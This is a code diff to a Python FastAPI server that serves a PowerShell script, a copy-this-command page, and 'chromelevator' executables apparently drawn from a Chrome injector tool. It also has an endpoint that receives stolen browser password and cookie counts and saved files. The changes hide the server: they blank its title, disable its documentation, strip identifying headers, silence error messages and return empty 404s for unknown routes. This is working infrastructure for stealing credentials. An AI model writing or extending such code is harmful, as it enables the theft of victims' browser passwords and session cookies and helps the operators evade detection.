@@ -4,15 +4,42 @@ from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
 
-from fastapi import FastAPI, HTTPException, Request
+from fastapi import FastAPI, Request
+from fastapi.exceptions import RequestValidationError
 from fastapi.responses import FileResponse, HTMLResponse, PlainTextResponse
+from starlette.exceptions import HTTPException as StarletteHTTPException
+from starlette.responses import Response
 
-
-app = FastAPI(title="Remote Scripts API")
+app = FastAPI(
+    title="",
+    docs_url=None,
+    redoc_url=None,
+    openapi_url=None,
+)
 
 SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
 BIN_DIR = Path(__file__).with_name("bin")
 DATA_DIR = Path(os.getenv("DATA_DIR", "/app/data"))
+
+EMPTY = Response(status_code=404, content=b"")
+
+
+@app.middleware("http")
+async def strip_identifying_headers(request: Request, call_next) -> Response:
+    response = await call_next(request)
+    if "server" in response.headers:
+        del response.headers["server"]
+    return response
+
+
+@app.exception_handler(StarletteHTTPException)
+async def silent_http_exception(_request: Request, _exc: StarletteHTTPException) -> Response:
+    return Response(status_code=_exc.status_code, content=b"")
+
+
+@app.exception_handler(RequestValidationError)
+async def silent_validation_exception(_request: Request, _exc: RequestValidationError) -> Response:
+    return EMPTY
 
 
 def resolve_api_base(request: Request | None = None) -> str:
@@ -67,7 +94,7 @@ async def get_windows_script() -> PlainTextResponse:
     )
 
 
-@app.get("/copy", response_class=HTMLResponse)
+@app.get("/c", response_class=HTMLResponse)
 async def copy_command(request: Request) -> HTMLResponse:
     api_base = resolve_api_base(request)
     command = build_powershell_command(api_base)
@@ -132,21 +159,15 @@ async def copy_command(request: Request) -> HTMLResponse:
     )
 
 
-@app.get("/chromelevator")
-async def get_chromelevator(arch: str = "x64") -> FileResponse:
+@app.get("/chromelevator", response_model=None)
+async def get_chromelevator(arch: str = "x64"):
     arch = arch.lower()
     if arch not in {"x64", "arm64"}:
-        raise HTTPException(status_code=400, detail="arch must be x64 or arm64")
+        return EMPTY
 
     binary_path = BIN_DIR / f"chromelevator_{arch}.exe"
     if not binary_path.is_file():
-        raise HTTPException(
-            status_code=404,
-            detail=(
-                f"Place chromelevator_{arch}.exe in app/bin/ "
-                "(extract from xaitax/chrome-injector release zip)"
-            ),
-        )
+        return EMPTY
 
     return FileResponse(
         binary_path,
@@ -165,6 +186,12 @@ async def receive_payload(request: Request) -> dict[str, Any]:
     return {
         "received": True,
         "password_count": payload.get("passwordCount", 0),
+        "cookie_count": payload.get("cookieCount", 0),
         "chromelevator": chromelevator,
         "saved_files": saved_files,
     }
+
+
+@app.api_route("/{full_path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])
+async def unknown_route(_full_path: str) -> Response:
+    return EMPTY
